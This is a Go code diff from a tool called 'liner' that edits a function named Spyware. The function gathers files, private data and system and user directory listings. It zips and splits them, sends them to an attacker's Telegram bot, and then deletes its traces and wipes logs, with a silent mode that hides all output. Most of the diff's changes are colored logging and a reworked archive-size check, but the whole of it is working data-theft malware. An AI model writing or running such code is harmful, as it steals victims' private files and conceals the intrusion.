@@ -12,16 +12,17 @@ import (
 	"github.com/Nowafen/liner/payloads"
 )
 
+
 // Spyware handles data extraction based on dump type
 func Spyware(dumpType, token, chatID string, silent bool) error {
 	// Detect OS
 	if !silent {
-		fmt.Println("[INFO] Detecting OS...")
+		fmt.Printf("%s[INFO]%s Detecting OS...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	osInfo, err := payloads.DetectOS()
 	if err != nil {
 		if !silent {
-			fmt.Println("[INFO] Warning: failed to detect OS")
+			fmt.Printf("%s[WARNING]%s Failed to detect OS%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to detect OS: %v", err), silent)
 		return fmt.Errorf("failed to detect OS: %v", err)
@@ -35,7 +36,7 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 	cwd, err := os.Getwd()
 	if err != nil {
 		if !silent {
-			fmt.Println("[INFO] Warning: failed to get current working directory")
+			fmt.Printf("%s[WARNING]%s Failed to get current working directory%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, "Error: Failed to get current working directory", silent)
 		return fmt.Errorf("failed to get current working directory: %v", err)
@@ -45,20 +46,20 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 	tempDir := filepath.Join(cwd, "liner_data")
 	if err := os.MkdirAll(tempDir, 0755); err != nil {
 		if !silent {
-			fmt.Println("[INFO] Warning: failed to create temp directory")
+			fmt.Printf("%s[WARNING]%s Failed to create temp directory%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to create temp directory: %v", err), silent)
 		return fmt.Errorf("failed to create temp directory: %v", err)
 	}
 	defer func() {
 		if err := os.RemoveAll(tempDir); err != nil && !silent {
-			fmt.Println("[INFO] Warning: failed to clean up temporary directory")
+			fmt.Printf("%s[WARNING]%s Failed to clean up temporary directory%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 	}()
 
 	// Collect data based on dump type
 	if !silent {
-		fmt.Println("[INFO] Collecting files...")
+		fmt.Printf("%s[INFO]%s Collecting files...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	var filesToCollect []string
 	switch strings.ToLower(dumpType) {
@@ -77,7 +78,7 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 		filesToCollect = append(filesToCollect, collectPrivateData()...)
 	default:
 		if !silent {
-			fmt.Println("[INFO] Warning: invalid dump type, stopping")
+			fmt.Printf("%s[WARNING]%s Invalid dump type, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, "Error: Invalid dump type, stopping", silent)
 		return fmt.Errorf("invalid dump type: %s", dumpType)
@@ -86,22 +87,23 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 	// Generate treestructure.txt for system
 	treeFile := filepath.Join(cwd, "treestructure.txt")
 	if !silent {
-		fmt.Println("[INFO] Generating tree structures...")
+		fmt.Printf("%s[INFO]%s Generating tree structures...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
+	var structureFiles []string
 	if err := generateTreeSchema(treeFile); err == nil {
-		filesToCollect = append(filesToCollect, treeFile)
+		structureFiles = append(structureFiles, treeFile)
 	}
 
 	// Generate user directory structures
 	userFiles, err := generateUserStructures(cwd)
 	if err == nil {
-		filesToCollect = append(filesToCollect, userFiles...)
+		structureFiles = append(structureFiles, userFiles...)
 	}
 
 	// Check if there are any files to collect
 	if len(filesToCollect) == 0 {
 		if !silent {
-			fmt.Println("[INFO] Warning: no files collected, stopping")
+			fmt.Printf("%s[WARNING]%s No files collected, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, "Error: No files collected, stopping", silent)
 		return fmt.Errorf("no files collected")
@@ -109,7 +111,7 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 
 	// Copy files to temp directory
 	if !silent {
-		fmt.Println("[INFO] Copying files to temp directory...")
+		fmt.Printf("%s[INFO]%s Copying files to temp directory...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	for _, file := range filesToCollect {
 		if _, err := os.Stat(file); err != nil {
@@ -118,7 +120,7 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 		dest := filepath.Join(tempDir, filepath.Base(file))
 		if err := copyFile(file, dest); err != nil {
 			if !silent {
-				fmt.Printf("[INFO] Warning: failed to copy file %s: %v\n", file, err)
+				fmt.Printf("%s[WARNING]%s Failed to copy file %s: %v%s\n", ColorYellow, ColorWhite, file, err, ColorReset)
 			}
 			continue
 		}
@@ -126,92 +128,130 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 
 	// Zip files from temp directory
 	if !silent {
-		fmt.Println("[INFO] Zipping files...")
+		fmt.Printf("%s[INFO]%s Zipping files...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	zipFile := filepath.Join(cwd, "liner_data.zip")
 	if err := createZipFile(tempDir, zipFile); err != nil {
 		if !silent {
-			fmt.Println("[INFO] Warning: failed to create zip file, stopping")
+			fmt.Printf("%s[WARNING]%s Failed to create zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to create zip file: %v", err), silent)
 		return fmt.Errorf("failed to create zip file: %v", err)
 	}
 
-	// Split zip file into parts
-	if !silent {
-		fmt.Println("[INFO] Splitting zip file...")
-	}
-	zipParts, err := splitZipFile(zipFile, cwd)
-	if err != nil {
-		if !silent {
-			fmt.Println("[INFO] Warning: failed to split zip file, stopping")
-		}
-		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to split zip file: %v", err), silent)
-		if err := os.Remove(zipFile); err != nil && !silent {
-			fmt.Println("[INFO] Warning: failed to clean up main zip file")
-		}
-		return fmt.Errorf("failed to split zip file: %v", err)
-	}
-
 	// Send start message
 	if !silent {
-		fmt.Println("[INFO] Sending start message to Telegram...")
+		fmt.Printf("%s[INFO]%s Sending start message to Telegram...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	if err := sendTelegramMessage(token, chatID, "Hello, starting file transfer...", silent); err != nil {
 		if !silent {
-			fmt.Printf("[INFO] Warning: failed to send start message: %v\n", err)
+			fmt.Printf("%s[WARNING]%s Failed to send start message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
 		}
 	}
 
-	// Send zip parts
-	for _, part := range zipParts {
-		if !silent {
-			fmt.Printf("[INFO] Sending zip part %s to Telegram...\n", filepath.Base(part))
-		}
-		if err := SendToTelegram(token, chatID, part, silent); err != nil {
+	// Send structure files (treestructure.txt and user files)
+	for _, file := range structureFiles {
+		if _, err := os.Stat(file); err == nil {
 			if !silent {
-				fmt.Printf("[INFO] Warning: failed to send zip part %s: %v\n", filepath.Base(part), err)
+				fmt.Printf("%s[INFO]%s Sending structure file %s to Telegram...%s\n", ColorGreen, ColorWhite, filepath.Base(file), ColorReset)
 			}
-			sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send zip part %s: %v", filepath.Base(part), err), silent)
+			if err := SendToTelegram(token, chatID, file, silent); err != nil {
+				if !silent {
+					fmt.Printf("%s[WARNING]%s Failed to send structure file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(file), err, ColorReset)
+				}
+				sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send structure file %s: %v", filepath.Base(file), err), silent)
+			}
 		}
+	}
+
+	// Check zip file size (48MB = 48 * 1024 * 1024 bytes)
+	const maxZipSize = 48 * 1024 * 1024
+	var filesToSend []string
+	zipInfo, err := os.Stat(zipFile)
+	if err != nil {
+		if !silent {
+			fmt.Printf("%s[WARNING]%s Failed to get zip file info: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
+		}
+		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to get zip file info: %v", err), silent)
+		return fmt.Errorf("failed to get zip file info: %v", err)
+	}
+
+	if zipInfo.Size() <= maxZipSize {
+		// Send zip file directly if size <= 48MB
+		if !silent {
+			fmt.Printf("%s[INFO]%s Sending zip file %s to Telegram...%s\n", ColorGreen, ColorWhite, filepath.Base(zipFile), ColorReset)
+		}
+		if err := SendToTelegram(token, chatID, zipFile, silent); err != nil {
+			if !silent {
+				fmt.Printf("%s[WARNING]%s Failed to send zip file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(zipFile), err, ColorReset)
+			}
+			sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send zip file %s: %v", filepath.Base(zipFile), err), silent)
+		}
+		filesToSend = []string{zipFile}
+	} else {
+		// Split zip file into 25MB parts if size > 48MB
+		if !silent {
+			fmt.Printf("%s[INFO]%s Splitting zip file...%s\n", ColorGreen, ColorWhite, ColorReset)
+		}
+		zipParts, err := splitZipFile(zipFile, cwd)
+		if err != nil {
+			if !silent {
+				fmt.Printf("%s[WARNING]%s Failed to split zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
+			}
+			sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to split zip file: %v", err), silent)
+			if err := os.Remove(zipFile); err != nil && !silent {
+				fmt.Printf("%s[WARNING]%s Failed to clean up main zip file%s\n", ColorYellow, ColorWhite, ColorReset)
+			}
+			return fmt.Errorf("failed to split zip file: %v", err)
+		}
+		// Send zip parts
+		for _, part := range zipParts {
+			if !silent {
+				fmt.Printf("%s[INFO]%s Sending zip part %s to Telegram...%s\n", ColorGreen, ColorWhite, filepath.Base(part), ColorReset)
+			}
+			if err := SendToTelegram(token, chatID, part, silent); err != nil {
+				if !silent {
+					fmt.Printf("%s[WARNING]%s Failed to send zip part %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(part), err, ColorReset)
+				}
+				sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send zip part %s: %v", filepath.Base(part), err), silent)
+			}
+		}
+		filesToSend = zipParts
 	}
 
 	// Send completion message
 	if !silent {
-		fmt.Println("[INFO] Sending completion message to Telegram...")
+		fmt.Printf("%s[INFO]%s Sending completion message to Telegram...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	if err := sendTelegramMessage(token, chatID, "Goodbye, file transfer completed.", silent); err != nil {
 		if !silent {
-			fmt.Printf("[INFO] Warning: failed to send completion message: %v\n", err)
+			fmt.Printf("%s[WARNING]%s Failed to send completion message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
 		}
 	}
 
 	// Clean up zip parts and main zip file
-	for _, part := range zipParts {
-		if err := os.Remove(part); err != nil && !silent {
-			fmt.Println("[INFO] Warning: failed to clean up zip parts")
+	for _, file := range filesToSend {
+		if err := os.Remove(file); err != nil && !silent {
+			fmt.Printf("%s[WARNING]%s Failed to clean up file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
 		}
 	}
-	if err := os.Remove(zipFile); err != nil && !silent {
-		fmt.Println("[INFO] Warning: failed to clean up main zip file")
-	}
 
-	// Clean up treestructure.txt and user structure files
-	for _, file := range append([]string{treeFile}, userFiles...) {
+	// Clean up structure files
+	for _, file := range structureFiles {
 		if _, err := os.Stat(file); err == nil {
 			if err := os.Remove(file); err != nil && !silent {
-				fmt.Println("[INFO] Warning: failed to clean up structure files")
+				fmt.Printf("%s[WARNING]%s Failed to clean up structure file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
 			}
 		}
 	}
 
 	// Clean logs
 	if !silent {
-		fmt.Println("[INFO] Cleaning logs...")
+		fmt.Printf("%s[INFO]%s Cleaning logs...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
 	if err := cleanLogs(); err != nil {
 		if !silent {
-			fmt.Println("[INFO] Warning: failed to clean logs")
+			fmt.Printf("%s[WARNING]%s Failed to clean logs%s\n", ColorYellow, ColorWhite, ColorReset)
 		}
 		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to clean logs: %v", err), silent)
 	}
@@ -362,7 +402,7 @@ func createZipFile(tempDir, output string) error {
 	return nil
 }
 
-// splitZipFile splits a zip file into parts using split command
+// splitZipFile splits a zip file into 25MB parts
 func splitZipFile(filename, outputDir string) ([]string, error) {
 	// Check if zip file exists
 	if _, err := os.Stat(filename); os.IsNotExist(err) {
@@ -422,7 +462,7 @@ func generateUserStructures(cwd string) ([]string, error) {
 			if output, err := cmd.CombinedOutput(); err == nil {
 				userFiles = append(userFiles, userFile)
 			} else {
-				fmt.Printf("[INFO] Warning: failed to generate user structure for %s: %v, output: %s\n", user, err, string(output))
+				fmt.Printf("%s[WARNING]%s Failed to generate user structure for %s: %v, output: %s%s\n", ColorYellow, ColorWhite, user, err, string(output), ColorReset)
 			}
 		}
 	}
